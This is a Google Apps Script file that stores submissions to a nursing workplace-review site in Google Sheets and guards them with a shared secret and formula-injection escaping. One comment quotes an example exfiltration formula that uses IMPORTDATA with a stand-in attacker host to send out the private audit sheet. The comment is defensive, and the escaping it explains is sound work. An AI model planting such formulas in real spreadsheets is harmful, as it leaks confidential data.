/**
 * 護理職場透明化 — 表單提交寫入 Google Sheet。
 *
 * 部署：Apps Script 編輯器 → 部署 → 新增部署作業 → 類型「網頁應用程式」
 *   - 執行身分：我
 *   - 具有存取權：任何人
 * 取得 /exec 網址，填入 tn-submit Worker 的 APPS_SCRIPT_URL secret。
 *
 * 安全：只接受帶正確 secret 的請求（由 tn-submit Worker 轉發並附上）。
 *       直接打本 Web App 而未帶 secret 者一律拒絕。
 *
 * 分頁配置：
 *   sub_<類別>  每個類別一個分頁（sub_icu、sub_ward…），各自「發布到網路 → CSV」
 *               後填進 js/env.js 的 LIVE.csvUrls。欄位隨投稿自動長出來。
 *   audit       AI 審稿的理由原文集中在這裡，**不要**發布。公開分頁只留
 *               modVerdict / modCode 兩欄，前端靠它們決定是否打馬賽克。
 */
// 機密與 ID 都放「專案設定 → 指令碼屬性」，不寫在程式碼裡
// （本 repo 是公開的，寫死會直接外流）：
//   SHARED_SECRET  必填，與 Worker 的 APPS_SCRIPT_SECRET 相同。沒設 → 一律拒絕，
//                  所以在你設定之前，這個 Web App 收不下任何東西。
//   SHEET_ID       選填。本專案綁在試算表上時不必設，會自動用所屬的那份。
const TIMEZONE = 'Asia/Taipei';

function prop_(key) {
  return PropertiesService.getScriptProperties().getProperty(key) || '';
}

/** 目標試算表：優先用 SHEET_ID 屬性，沒有就用本專案所屬的試算表 */
function book_() {
  const id = prop_('SHEET_ID');
  return id ? SpreadsheetApp.openById(id) : SpreadsheetApp.getActiveSpreadsheet();
}

// 允許的類別 slug（與 js/config.js 的 CATEGORIES 一致）。不在清單內一律歸 other，
// 避免有人偽造 category 參數在試算表裡長出一堆垃圾分頁。
const CATEGORIES = ['ward', 'icu', 'er', 'or', 'outpatient', 'clinic', 'dialysis', 'psych', 'special', 'other'];

// 只存在 audit 分頁、不進公開分頁的欄位
const AUDIT_ONLY = ['modReason', 'modStatus'];

// 標記資料來源：'form' = 真投稿、'mock' = seed.gs 灌的測試資料（見 seed.gs）
const DATA_SOURCE_COLUMN = 'dataSource';

/**
 * 防 Google Sheets 公式注入。
 *
 * appendRow() 會把 "=" 開頭的字串當公式執行，投稿者因此可以填
 *   =IMPORTDATA("https://evil.tld/?x="&audit!G2)
 * 讓試算表被打開時，由 Google 伺服器把 audit 分頁（含被屏蔽的短評原文、
 * AI 審稿理由）送到外部主機。IMAGE()／HYPERLINK() 同理。
 *
 * 對策：凡是以 = + - @ 或前導 Tab/換行 開頭者，前面補一個單引號強制當純文字。
 * 單引號不會顯示、也不會進發布的 CSV，對前端完全無感。
 */
function safeCell_(v) {
  var s = (v === undefined || v === null) ? '' : String(v);
  return /^[=+\-@\t\r\n]/.test(s) ? "'" + s : s;
}

function doPost(e) {
  try {
    const p = (e && e.parameter) || {};
    const secret = prop_('SHARED_SECRET');
    if (!secret || p.secret !== secret) {
      return _json({ error: 'forbidden' });
    }
    return _json(writeSubmission_(p));
  } catch (err) {
    return _json({ error: String(err) });
  }
}

/** 實際寫入試算表。密鑰檢查在 doPost，這裡只管寫，讓 selftest 可以直接呼叫。 */
function writeSubmission_(p) {
  const ss = book_();
  const slug = CATEGORIES.indexOf(String(p.category || '')) >= 0 ? String(p.category) : 'other';
  const ts = Utilities.formatDate(new Date(), TIMEZONE, 'yyyy-MM-dd HH:mm');

  // ① 公開分頁：sub_<類別>
  const sh = ss.getSheetByName('sub_' + slug) || ss.insertSheet('sub_' + slug);
  const publicKeys = Object.keys(p)
    .filter(function (k) { return k !== 'secret' && k !== 'category' && AUDIT_ONLY.indexOf(k) < 0; })
    .sort();

  if (sh.getLastRow() === 0) {
    sh.appendRow(['timestamp'].concat(publicKeys).concat([DATA_SOURCE_COLUMN]));
  }
  // 表頭已存在但少了新欄位（例如後來才加的 modVerdict / modCode）→ 自動補在最右邊，
  // 舊資料列該欄留空。這樣改欄位時不必手動改試算表。
  let header = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0];
  const missing = publicKeys.concat([DATA_SOURCE_COLUMN])
    .filter(function (k) { return header.indexOf(k) === -1; });
  if (missing.length) {
    sh.getRange(1, header.length + 1, 1, missing.length).setValues([missing.map(safeCell_)]);
    header = header.concat(missing);
  }
  sh.appendRow(header.map(function (h) {
    if (h === 'timestamp') return ts;
    if (h === DATA_SOURCE_COLUMN) return 'form';   // 'mock' = seed.gs 灌的測試資料
    return p[h] !== undefined ? safeCell_(p[h]) : '';
  }));

  // ② 稽核分頁：AI 審稿理由原文（勿發布）
  const audit = ss.getSheetByName('audit') || ss.insertSheet('audit');
  if (audit.getLastRow() === 0) {
    audit.appendRow(['timestamp', 'category', 'modVerdict', 'modCode', 'modStatus', 'modReason', 'comment']);
  }
  audit.appendRow([ts, slug, safeCell_(p.modVerdict), safeCell_(p.modCode),
                   safeCell_(p.modStatus), safeCell_(p.modReason), safeCell_(p.comment)]);

  return { ok: true, sheet: 'sub_' + slug };
}

/**
 * 健康檢查：部署完把 /exec 網址貼進瀏覽器，看到 {"ok":true,...} 就代表部署成功。
 * 不吐任何投稿內容。
 */
function doGet() {
  let sheetName = '';
  try {
    sheetName = book_().getName();
  } catch (err) {
    sheetName = '';
  }
  return _json({
    ok: true,
    service: 'transparent-nursing submit',
    sheetReachable: !!sheetName,
    sheetTitle: sheetName,
    secretConfigured: !!prop_('SHARED_SECRET'),
    now: Utilities.formatDate(new Date(), TIMEZONE, 'yyyy-MM-dd HH:mm'),
  });
}

/**
 * 一鍵產生並儲存 SHARED_SECRET（不必開終端機）。
 *
 * 在編輯器選這個函式按「執行」，它會產生一串 64 碼隨機字串存進指令碼屬性，
 * 並印在下方的「執行記錄」。複製那串去設 Worker 的 APPS_SCRIPT_SECRET，
 * 兩邊一字不差就通了。
 *
 * 已經有值時不會覆蓋（避免把正在用的密鑰洗掉），只會把現有的印出來。
 * 真要換一組，先執行 clearSecret() 再跑這支。
 */
function setupSecret() {
  const props = PropertiesService.getScriptProperties();
  const existing = props.getProperty('SHARED_SECRET');
  if (existing) {
    Logger.log('已經有 SHARED_SECRET，沿用現有這組：\n' + existing);
    return existing;
  }
  // UUID 去掉連字號 = 32 碼十六進位；串兩組成 64 碼
  const secret = (Utilities.getUuid() + Utilities.getUuid()).replace(/-/g, '');
  props.setProperty('SHARED_SECRET', secret);
  Logger.log('已產生並儲存 SHARED_SECRET：\n' + secret +
             '\n\n請複製上面那串，設成 Worker 的 APPS_SCRIPT_SECRET。');
  return secret;
}

/** 刪掉現有的 SHARED_SECRET（要換密鑰時用）。刪掉後 doPost 會拒絕所有請求。 */
function clearSecret() {
  PropertiesService.getScriptProperties().deleteProperty('SHARED_SECRET');
  Logger.log('已刪除 SHARED_SECRET。記得重新執行 setupSecret() 並同步更新 Worker。');
}

/**
 * 自我測試：不經 Worker、也不經密鑰檢查，直接寫一筆進 sub_other 與 audit。
 * 在編輯器選這個函式按執行，確認試算表真的寫得進去。測完記得把那列刪掉。
 */
function selftest() {
  const res = writeSubmission_({
    category: 'other',
    institutionName: '【測試】請刪除這一列',
    comment: 'selftest',
    modVerdict: 'allow',
    modCode: '',
    modStatus: 'skip',
    modReason: '',
  });
  Logger.log(JSON.stringify(res));
  return res;
}

function _json(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj)).setMimeType(ContentService.MimeType.JSON);
}
